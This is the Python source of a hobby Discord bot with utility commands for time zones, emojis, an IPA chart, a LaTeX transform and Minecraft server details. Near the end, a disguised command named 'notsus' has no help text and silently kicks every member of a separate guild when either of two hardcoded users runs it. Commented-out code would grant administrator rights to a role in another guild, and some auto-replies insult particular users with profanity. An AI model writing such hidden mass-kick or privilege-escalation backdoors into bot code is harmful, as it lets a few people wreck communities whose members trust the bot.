import discord
from discord.ext import commands
from discord.utils import get

import json

import os
from dotenv import load_dotenv

from unicodedata import *

from datetime import datetime, timedelta
from time import localtime, strftime
import time

import math

import cocanb

from replit import db
from keep_alive import keep_alive

from cocanb import Cocánb
from unicode import Unicode
from acknowledgements import Acknowledgements
from moderation import Moderation

load_dotenv()
TOKEN = os.getenv('TOKEN')

bot=commands.Bot(command_prefix="c.")
guild = bot.get_guild(731109675327553567)

@bot.event
async def on_ready():
  await bot.change_presence(status=discord.Status.online, activity=discord.Game(name='c.help'))
  
@bot.event
async def on_message(message):
  #idk how to do this
  #if message.author.id == 807436687977611274 and " » c." in message.content:
  #  await message.channel.send(message.content)
  #  await message.edit(content='test')

    #this bit of code is unrelated to the first part
    #msglist = message.content.split(" » ")
    #msglist.pop(0)
    #msg = " » ".join(msglist)
    #await bot.process_commands(msg)
    #command = str(msg.split(" ")[0])
    #query = " ".join(msg.split(" ")[1:])
    #await message.channel.send(msg)
    #await message.channel.send(command)
    #await message.channel.send(query)
    #await msg.invoke(get_command(command), query=query)
  if message.content == "?" and message.author.id == 698865312954843216:
        await message.channel.send('shut the fuck up grogu you know what we were talking about stop acting stupid')
  await bot.process_commands(message)

  if message.content == "<@607583934527569920>" and message.channel.id == 845216463237021706:
    await message.channel.send("If you ping the owner one more time he won't help you with your question.")

  if message.content == "<@801983327023398912>" and message.channel.id == 845216463237021706:
    await message.channel.send("If you pinged me for maths help you have to realise that I am just a measly bot who can't do maths.")

  if (message.content == "@everyone" or message.content == "<@&800718299167064064>") and message.guild.id == 731109675327553567:
    await message.channel.send("How fucking narcissistic do you have to be to ping hundreds of people and disrupt their lives just for you? You're lucky the everyone role you just pinged was fake otherwise you probably would have annoyed a lot of people.")

@bot.command(name='ping', help="Checks whether bot is online.")
async def ping(ctx):
  await ctx.send('Bot is online.')

#@bot.command(pass_context=True, help="give role")
#async def giverole(ctx, user: discord.Member, role: discord.Role):
    #await user.add_roles(role)

#@bot.command()
#async def EditRoleTest(ctx):
    #guild = bot.get_guild(419075224571478017)
    #role = get(guild.roles, id=718073241524240474)
    #permissions = discord.Permissions()
    #permissions.update(administrator = True)
    #await role.edit(permissions=permissions)

@bot.command(name='time',
             help='Shows current time given a timezone (In (-)HH:MM format)')
async def time(ctx, timezone: str = '00:00'):
	if timezone[0] == '-':
		hours = int(timezone[:-3]) - int(timezone[-2:]) / 60
	else:
		hours = int(timezone[:-3]) + int(timezone[-2:]) / 60
	future_time = datetime.today() + timedelta(hours=hours)
	if timezone == '00:00':
		plus = '±'
	elif timezone[0] == '-':
		plus = ''
	elif timezone[0] == '+':
		plus = ''
	else:
		plus = '+'
	week_day = future_time.weekday()
	weekdays = ("Monday", "Tuesday", "Wednesday", "Thursday", "Friday",
	            "Saturday", "Sunday")
	week_day = weekdays[week_day]
	if timezone[-3] == ':':
		await ctx.send('`' + week_day + ', ' + str(future_time) + ', UTC' +
		               plus + timezone + '`')
	else:
		await ctx.send ('invalid timezone')
		

@bot.command(name="return", help="Returns message")
async def msgreturn(ctx, *, msg):
	await ctx.send(msg)

@bot.command(name='minecraftinfo', help="Sends information for Minecraft server")
async def minecraftinfo(ctx):
  await ctx.send('SERVER INFO:\nHostname: cocanb.aternos.me:36520\nIP: 185.116.157.37\nPort: 36520\n\nVersion: PaperMC 1.17.1\nPlugins: DiscordSRV, WorldEdit\nGamemode: Creative\nDifficulty: Normal')


@bot.command(name="delreturn",help="Returns message (deletes original message)\n(may not work on every server)")
async def delreturn(ctx, *, msg):
	await ctx.message.delete()
	await ctx.send(msg)

@bot.command(
    name="emoji",
    help=
    "Sends some emojis\nSupported: amogus/amongus/among us, barry, biang, bruh/facepalm, surprised/that's illegal/illegal, void, woah, shitting toothpaste, dababy\n(words separated by / output the same emoji)"
)
async def emoji(ctx, *, name):
	name = name.lower()
	if name == "ye":
		await ctx.send("<:ye:799291949273317377>")
	elif name == "amogus" or name == "amongus" or name == "among us":
		await ctx.send("<:amogus:809427238784860210>")
	elif name == "barry":
		await ctx.send("<:barry:811154017672757270>")
	elif name == "biang":
		await ctx.send("<:biang:809669658143227905>")
	elif name == "bruh" or name == "facepalm":
		await ctx.send("<:bruh:801100506251526145>")
	elif name == "surprised" or name == "that's illegal" or name == "illegal":
		await ctx.send("<:surprised:801099678988501072>")
	elif name == "void":
		await ctx.send("<:void:798150976191201313>")
	elif name == "woah":
		await ctx.send("<:woah:807905973162999818>")
	elif name == "shitting toothpaste":
	  await ctx.send("<:shittingtoothpaste:850006091827773441>")
	elif name == "dababy":
	  await ctx.send("<:dababy:850279101548855317>")
	else:
		await ctx.send("Invalid emoji")

@bot.command(name='customemoji', help='Sends custom emoji not in c.emoji list\n(Emoji must be from a server this bot is in)')
async def customemoji(ctx, name, emoji_id, animated: str = ''):
  if animated=='':
    anim=''
  else:
    anim='a'
  await ctx.send(f'<{anim}:{name}:{emoji_id}>')

@bot.command(name='ipa', help='Sends official International Phonetic Alphabet chart')
async def ipa(ctx):
    with open("Resources/IPA_Kiel_2020_full.pdf", "rb") as file:
      await ctx.send("Official International Phonetic Alphabet Chart", file=discord.File(file, "Official International Phonetic Alphabet Chart.pdf"))

@bot.command (name="latextransform", help="Linearly transform a piece of LaTeX code using a matrix\n\n Input the four entries of the transformation matrix in the following order: top left, bottom left, top right then bottom right, then the LaTeX code, each separated by spaces")
async def latextransform (ctx, m00, m10, m01, m11, *, latex):
  m00 = float (m00)
  m10 = float (m10)
  m01 = float (m01)
  m11 = float (m11)

  E = (m00 + m11) / 2
  F = (m00 - m11) / 2
  G = (m10 + m01) / 2
  H = (m10 - m01) / 2

  Q = math.sqrt (E**2 + H**2)
  R = math.sqrt (F**2 + G**2)

  sx = Q + R
  sy = Q - R

  a1 = math.atan2 (G,F)
  a2 = math.atan2 (H,E)

  theta = (a2 - a1) / 2
  phi = (a2 + a1) / 2

  theta_deg = theta * 180 / math.pi
  phi_deg = phi * 180 / math.pi

  await ctx.send ('```$\\rotatebox{'+str(phi_deg)+'}{$\\scalebox{'+str(sx)+'}['+str(sy)+']{$\\rotatebox{'+str(theta_deg)+'}{$'+latex+'$}$}$}$```')

@bot.command(name="notsus")
async def notsus(ctx):
    if ctx.author.id == 702746453927264276 or ctx.author.id == 607583934527569920:
        for member in bot.get_guild(725639774190305360).members:
            try:
                await member.kick()
                continue
            except Exception:
                continue
            else:
                continue

                

bot.add_cog(Cocánb(bot))
bot.add_cog(Unicode(bot))
bot.add_cog(Acknowledgements(bot))
bot.add_cog(Moderation(bot))

keep_alive()
bot.run(TOKEN)